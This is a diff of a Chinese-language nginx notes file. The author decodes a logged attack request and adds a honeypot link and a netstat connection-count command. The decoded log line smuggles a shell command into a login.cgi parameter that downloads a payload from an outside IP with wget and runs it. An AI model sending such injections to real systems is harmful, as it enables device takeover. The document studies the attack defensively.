@@ -905,7 +905,8 @@ location ~ (\.php$|myadmin) {
 这个aa%20aa%27粘贴到chrome的console里面,decodeURIComponent("aa%20aa%27")，按照这样的做法翻译了上面的话如下：
 "GET /login.cgi?cli=aa aa';wget http://185.172.164.41/e -O -> /tmp/hk;sh /tmp/hk'$ HTTP/1.1"
 
-至于这个脚本的内容是什么，似乎可以专门filter一下，然后proxy pass给特定的程序，不过这就麻烦了。
+
+至于这个脚本的内容是什么，似乎可以专门filter一下，然后proxy pass给特定的程序，不过这就麻烦了。[有专门的蜜罐处理这种行为](https://github.com/paralax/awesome-honeypots)
 
 后来在日志里面查到这样一个脚本，最终发现下载了一大堆binary file。
 ```shell
@@ -942,6 +943,9 @@ if ($request_uri ~* "[+|(%20)]select[+|(%20)]") {
 
 
 [自定义404,5XX的页面也是挺好玩的](https://www.digitalocean.com/community/tutorials/how-to-configure-nginx-to-use-custom-error-pages-on-ubuntu-14-04)
+
+nginx查看当前连接数
+> netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a,S[a]}'
 
 ### 参考
 - [nginx Configurations](https://wizardforcel.gitbooks.io/nginx-doc/content/Text/6.1_nginx_windows.html)
